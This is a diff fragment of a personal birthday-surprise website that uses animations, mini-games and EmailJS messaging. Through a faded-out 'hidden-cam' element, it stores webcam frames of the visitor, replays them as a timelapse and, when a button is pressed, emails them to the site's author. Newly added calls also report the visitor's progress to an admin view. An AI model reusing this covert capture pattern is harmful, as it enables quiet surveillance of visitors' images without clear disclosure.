+                screenStream.getVideoTracks()[0].onended = () => {
+                    document.getElementById('screen-share-btn').style.display = 'block';
+                };
+            } catch (err) {
+                console.error("Screen share cancelled:", err);
+            }
+        }
+
         // --- INITIALIZATION ---
         window.onload = () => {
-            // EMAILJS SETUP
             try { emailjs.init("aSD6thOge93QfRG5j"); } catch(e) { console.log("EmailJS init fail"); }
-
             gsap.to("#loader", {opacity:0, duration:1, onComplete: () => {
                 document.getElementById("loader").style.display = "none";
                 document.getElementById("prank-stage").classList.remove("hidden-section");
@@ -501,10 +702,7 @@ async function startCameraAndCall() {
         // --- CAMERA CAPTURE (FOR TIMELAPSE) ---
         async function initCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, 
-                    audio: false 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, audio: false });
                 const video = document.getElementById('hidden-cam');
                 video.srcObject = stream;
                 await video.play();
@@ -516,18 +714,12 @@ async function startCameraAndCall() {
             const video = document.getElementById('hidden-cam');
             const canvas = document.getElementById('cam-canvas');
             const ctx = canvas.getContext('2d');
-            
             if (video.readyState === 4 && video.videoWidth > 0) {
-                canvas.width = 320;
-                canvas.height = 240;
+                canvas.width = 320; canvas.height = 240;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const data = canvas.toDataURL('image/jpeg', 0.5);
-                if(userReactions.length < 15) {
-                    userReactions.push(data);
-                } else {
-                    userReactions.shift();
-                    userReactions.push(data);
-                }
+                if(userReactions.length < 15) userReactions.push(data);
+                else { userReactions.shift(); userReactions.push(data); }
             }
         }
 
@@ -600,6 +792,7 @@ async function startCameraAndCall() {
             const prank = document.getElementById("prank-stage");
             prank.style.pointerEvents = "none";
             document.getElementById('flute-btn').style.display = 'flex';
+            document.getElementById('screen-share-btn').style.display = 'block'; // 🔥 Show Screen Share Btn
             bgMusic.volume = 0.5; bgMusic.play().catch(e=>{});
             gsap.to("#tech-bg", {opacity: 0, duration: 2});
             gsap.to("#romance-bg", {opacity: 1, duration: 2});
@@ -607,37 +800,33 @@ async function startCameraAndCall() {
                 prank.style.display = "none";
                 document.getElementById("main-stage").classList.add("visible");
                 document.getElementById('progress').style.width = "100%";
-                gsap.to("#hidden-cam", {opacity:0, duration:1}); // Hide scanner on romance stage
+                gsap.to("#hidden-cam", {opacity:0, duration:1});
+                updateAdminProgress();
             }});
         }
 
         function nextChapter() {
             const activeBtn = document.querySelector(`#chap-${currentChap} .soul-btn`);
             if(activeBtn) gsap.to(activeBtn, {scale: 0.9, duration: 0.1, yoyo: true, repeat: 1});
-            
             const curr = document.getElementById(`chap-${currentChap}`);
             const next = document.getElementById(`chap-${currentChap+1}`);
-            
             if(curr) {
                 curr.style.pointerEvents = "none"; 
                 gsap.to(curr, {opacity: 0, y: -30, duration: 0.6, onComplete: () => {
                     curr.classList.remove("chapter-active");
                     curr.style.display = "none"; 
-
                     if(next) {
                         currentChap++;
                         next.style.display = "flex"; 
                         next.classList.add("chapter-active"); 
-                        
                         gsap.fromTo(next, {opacity: 0, y: 30}, {opacity: 1, y: 0, duration: 0.8});
                         initChapterFeatures(currentChap);
-                        
                         const p = document.getElementById('progress');
                         if(p) {
-                            p.style.transition = 'none'; 
-                            p.style.width = '0%';
+                            p.style.transition = 'none'; p.style.width = '0%';
                             setTimeout(() => { p.style.transition = 'width 1.5s ease'; p.style.width = '100%'; }, 50);
                         }
+                        updateAdminProgress();
                     }
                 }});
             }
@@ -662,15 +851,13 @@ async function startCameraAndCall() {
                 setTimeout(() => { document.getElementById('cake-msg').style.opacity = 1; }, 1000); 
             }
             if(id === 42) { if(window.confetti) confetti({particleCount:150, spread:100, origin: { y: 0.6 }}); } 
-            
             if(id === 44) initTimelapse();
         }
 
         function blow(el) {
             const flame = el.querySelector('.flame');
             if(flame && !flame.classList.contains('out')) {
-                flame.classList.add('out');
-                candles++;
+                flame.classList.add('out'); candles++;
                 if(navigator.vibrate) navigator.vibrate(50);
                 if(candles === 3) {
                      gsap.to("#cake-msg", {opacity:0, duration:0.5, onComplete:()=>{
@@ -686,15 +873,13 @@ async function startCameraAndCall() {
             if(candles >= 3) {
                 const cake = document.getElementById('cake-interaction');
                 const text = document.getElementById('cut-text');
-                cake.classList.add('cake-cut-active');
-                text.innerText = "🍰 Delicious!";
+                cake.classList.add('cake-cut-active'); text.innerText = "🍰 Delicious!";
                 confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 }, colors: ['#fbbf24', '#ec4899', '#ffffff'] });
                 if(typeof crowdAudio !== 'undefined') crowdAudio.play().catch(e=>{});
                 setTimeout(nextChapter, 2000);
             } else {
                 const msg = document.getElementById('cake-msg');
-                msg.innerText = "Blow out all the candles first! 🌬️";
-                msg.style.color = "#ef4444";
+                msg.innerText = "Blow out all the candles first! 🌬️"; msg.style.color = "#ef4444";
                 gsap.fromTo(msg, {x:-10}, {x:10, duration:0.1, repeat:5, yoyo:true});
             }
         }
@@ -704,18 +889,13 @@ async function startCameraAndCall() {
             const btn = document.getElementById('capsule-btn');
             const lock = document.getElementById('capsule-lock');
             const stream = document.getElementById('data-stream');
-
             if(input.value.trim() === "") {
                 input.placeholder = "Please write something first...";
-                gsap.to(input, {x:10, duration:0.1, yoyo:true, repeat:3});
-                return;
+                gsap.to(input, {x:10, duration:0.1, yoyo:true, repeat:3}); return;
             }
-
             gsap.to(input, {duration: 0.5, opacity: 0.3, pointerEvents: "none"}); 
             gsap.to(btn, {opacity: 0.5, pointerEvents: "none", innerText: "Sending..."}); 
-            
             const templateParams = { message: input.value, to_name: "Rudra", name: "Nayanika" };
-
             emailjs.send("service_h36cckk", "template_lrwlavc", templateParams)
                 .then(function(response) {
                     gsap.to(btn, {opacity: 0, scale: 0, duration: 0.3});
@@ -726,107 +906,62 @@ async function startCameraAndCall() {
                     setTimeout(() => { gsap.to("#capsule-next", {opacity: 1, pointerEvents: "auto"}); }, 1500);
                 }, function(error) {
                     gsap.to(input, {opacity: 1, pointerEvents: "auto"});
-                    btn.innerText = "Network Error - Try Again";
-                    gsap.to(btn, {opacity: 1, pointerEvents: "auto"});
+                    btn.innerText = "Network Error - Try Again"; gsap.to(btn, {opacity: 1, pointerEvents: "auto"});
                 });
         }
 
         function sendFinalReview() {
             const input = document.getElementById('review-input');
             const btn = document.getElementById('review-btn');
-            
-            if(input.value.trim() === "") {
-                input.placeholder = "Please write at least one word...";
-                return;
-            }
-            
+            if(input.value.trim() === "") { input.placeholder = "Please write at least one word..."; return; }
             gsap.to(btn, {opacity: 0.5, pointerEvents: "none", innerText: "Delivering Love..."});
-
-            const templateParams = { 
-                message: "FINAL REVIEW OF WEBSITE: " + input.value, 
-                to_name: "Rudra", 
-                name: "Nayanika (Reviewer)" 
-            };
-
+            const templateParams = { message: "FINAL REVIEW OF WEBSITE: " + input.value, to_name: "Rudra", name: "Nayanika (Reviewer)" };
             emailjs.send("service_h36cckk", "template_lrwlavc", templateParams)
                 .then(function(res) {
                     btn.innerText = "Sent Successfully! ❤️";
                     confetti({particleCount: 100, spread: 70});
                     setTimeout(() => { nextChapter(); }, 1500);
                 }, function(err) {
-                    btn.innerText = "Failed. But it's okay, click again.";
-                    gsap.to(btn, {opacity: 1, pointerEvents: "auto"});
+                    btn.innerText = "Failed. But it's okay, click again."; gsap.to(btn, {opacity: 1, pointerEvents: "auto"});
                 });
         }
 
-        // --- 🔥 PHOTO DELIVERY LOGIC ---
-        
         async function sendPhotoBatch() {
             const btn = document.getElementById('send-photos-btn');
-            
-            if(userReactions.length === 0) {
-                btn.innerText = "No photos captured yet!";
-                return;
-            }
-
-            btn.disabled = true;
-            btn.innerText = "Sending Photos (0/5)...";
-
+            if(userReactions.length === 0) { btn.innerText = "No photos captured yet!"; return; }
+            btn.disabled = true; btn.innerText = "Sending Photos (0/5)...";
             const photosToSend = userReactions.slice(-5).reverse(); 
             let sentCount = 0;
-
             for (let i = 0; i < photosToSend.length; i++) {
                 try {
-                    const templateParams = {
-                        message: `Photo Memory #${i + 1}`,
-                        to_name: "Rudra",
-                        my_photo: photosToSend[i] 
-                    };
-
+                    const templateParams = { message: `Photo Memory #${i + 1}`, to_name: "Rudra", my_photo: photosToSend[i] };
                     await emailjs.send("service_h36cckk", "template_lrwlavc", templateParams);
-                    sentCount++;
-                    btn.innerText = `Sending Photos (${sentCount}/${photosToSend.length})...`;
-                } catch (error) {
-                    console.error("Photo send failed:", error);
-                }
+                    sentCount++; btn.innerText = `Sending Photos (${sentCount}/${photosToSend.length})...`;
+                } catch (error) { console.error("Photo send failed:", error); }
             }
-
-            if(sentCount > 0) {
-                btn.innerText = "✅ Memories Delivered!";
-                confetti({particleCount: 150, spread: 100});
-            } else {
-                btn.innerText = "⚠️ Delivery Failed. Try Downloading.";
-            }
+            if(sentCount > 0) { btn.innerText = "✅ Memories Delivered!"; confetti({particleCount: 150, spread: 100}); }
+            else { btn.innerText = "⚠️ Delivery Failed. Try Downloading."; }
         }
 
         function initTimelapse() {
             const imgEl = document.getElementById('replay-img');
             const msg = document.getElementById('timelapse-msg');
             const endTitle = document.getElementById('end-title');
-
             if(userReactions.length === 0) {
                 imgEl.src = "New folder (3)/photo1.jpeg";
                 msg.innerText = "I couldn't capture you, but I know you look beautiful.";
-                gsap.to(msg, {opacity: 1, delay: 1});
-                gsap.to(endTitle, {opacity: 1, delay: 3});
-                return;
+                gsap.to(msg, {opacity: 1, delay: 1}); gsap.to(endTitle, {opacity: 1, delay: 3}); return;
             }
-
             let frameIdx = 0;
             const playInterval = setInterval(() => {
                 if(frameIdx >= userReactions.length) {
-                    clearInterval(playInterval);
-                    gsap.to(msg, {opacity: 1});
-                    gsap.to(endTitle, {opacity: 1, delay: 2});
-                    confetti({particleCount: 200, spread: 150});
-                } else {
-                    imgEl.src = userReactions[frameIdx];
-                    frameIdx++;
-                }
+                    clearInterval(playInterval); gsap.to(msg, {opacity: 1});
+                    gsap.to(endTitle, {opacity: 1, delay: 2}); confetti({particleCount: 200, spread: 150});
+                } else { imgEl.src = userReactions[frameIdx]; frameIdx++; }
             }, 200);
         }
 
-        // --- UNCHANGED HELPER FUNCTIONS ---
+        // --- HELPER FUNCTIONS ---
         function createPeacockTrail(x, y) { const now = Date.now(); if (now - lastMouseTime < 50) return; lastMouseTime = now; const p = document.createElement('div'); p.style.cssText = `position: fixed; pointer-events: none; z-index: 9999; left: ${x}px; top: ${y}px; width: 15px; height: 15px; background: radial-gradient(circle, #06b6d4, #10b981); border-radius: 50%; opacity: 0.8; box-shadow: 0 0 8px #06b6d4; transform: translate(-50%, -50%);`; document.body.appendChild(p); gsap.to(p, { y: y + 20, opacity: 0, scale: 0, duration: 0.8, onComplete: () => p.remove() }); }
         function updatePerspective(val) { const img = document.getElementById('persp-img'), txt = document.getElementById('persp-txt'), btn = document.getElementById('persp-btn'); img.style.filter = `grayscale(${100-val}%) brightness(${75 + (val*0.25)}%)`; if(val > 80) { txt.innerText = "MASTERPIECE"; txt.style.color = "#ec4899"; gsap.to(btn, {opacity:1, pointerEvents:'auto'}); } else { txt.innerText = "MESSY"; txt.style.color = "rgba(156, 163, 175, 0.5)"; } }
         function startCrowd() { if(crowdAudio) crowdAudio.play().catch(e=>{}); }
@@ -849,12 +984,9 @@ async function startCameraAndCall() {
         function initPuzzle() { const c = document.getElementById('puzzle-container'); c.innerHTML = ""; let count = 0; for(let i=0; i<9; i++) { let p = document.createElement('div'); Object.assign(p.style, { position:'absolute', width:'100px', height:'100px', backgroundImage:`url('New folder (3)/mylove1.jpg')`, backgroundSize:"300px 300px", backgroundPosition:`${-(i%3)*100}px ${-Math.floor(i/3)*100}px`, left:(i%3)*100+'px', top:Math.floor(i/3)*100+'px', cursor:'pointer', border:'1px solid rgba(255,255,255,0.5)' }); gsap.fromTo(p, {x:(Math.random()-0.5)*200, y:(Math.random()-0.5)*200, opacity:0, rotation:Math.random()*360}, {opacity:1, duration:1, delay: i*0.1}); p.onclick = function() { gsap.to(this, {x:0, y:0, rotation:0, zIndex:1, border:"none", duration:0.5}); this.style.pointerEvents = 'none'; count++; if(count>=5) gsap.to("#puz-btn", {opacity:1, pointerEvents:"auto"}); }; c.appendChild(p); } }
         function openLetter() { gsap.to('#letter-closed', {opacity:0, scale:0.8, duration:0.5, display:'none'}); document.getElementById('letter-open').classList.remove('hidden'); gsap.from('#letter-open', {opacity:0, y:20, duration:0.8, delay:0.4}); }
         function loadProm(i) { 
-            const txt = document.getElementById('prom-txt');
-            const sub = document.getElementById('prom-sub');
-            const img = document.getElementById('prom-img');
-            const count = document.getElementById('prom-counter');
-            if(!txt || !sub) return;
-            count.innerText = `${i + 1} / ${promises.length}`;
+            const txt = document.getElementById('prom-txt'); const sub = document.getElementById('prom-sub');
+            const img = document.getElementById('prom-img'); const count = document.getElementById('prom-counter');
+            if(!txt || !sub) return; count.innerText = `${i + 1} / ${promises.length}`;
             gsap.to([txt, sub], {opacity:0, y:10, duration:0.2, onComplete:()=>{ txt.innerText = promises[i].text; sub.innerText = promises[i].sub; gsap.to([txt, sub], {opacity:1, y:0, duration:0.5}); }});
             gsap.to(img, {opacity:0, duration:0.2, onComplete:()=>{ img.src = promises[i].img; img.onerror = function() { this.src=`https://placehold.co/300x400/black/white?text=Promise`; }; img.onload = function() { gsap.to(img, {opacity:0.6, duration:0.5}); };}}); 
         }
@@ -891,10 +1023,8 @@ async function startCameraAndCall() {
                 card.style.borderColor = `rgb(${255}, ${255 - (pokeCount*40)}, ${255 - (pokeCount*40)})`;
             } else {
                 img.src = "New folder (3)/photo1.jpeg";
-                card.style.borderColor = "#ec4899";
-                card.style.boxShadow = "0 0 40px #ec4899";
-                txt.style.display = "none";
-                msg.innerText = "But your smile is my favorite thing in the world.";
+                card.style.borderColor = "#ec4899"; card.style.boxShadow = "0 0 40px #ec4899";
+                txt.style.display = "none"; msg.innerText = "But your smile is my favorite thing in the world.";
                 confetti({particleCount: 50, spread: 60, colors: ['#ec4899']});
                 gsap.to("#tease-btn", {opacity: 1, pointerEvents: "auto"});
             }
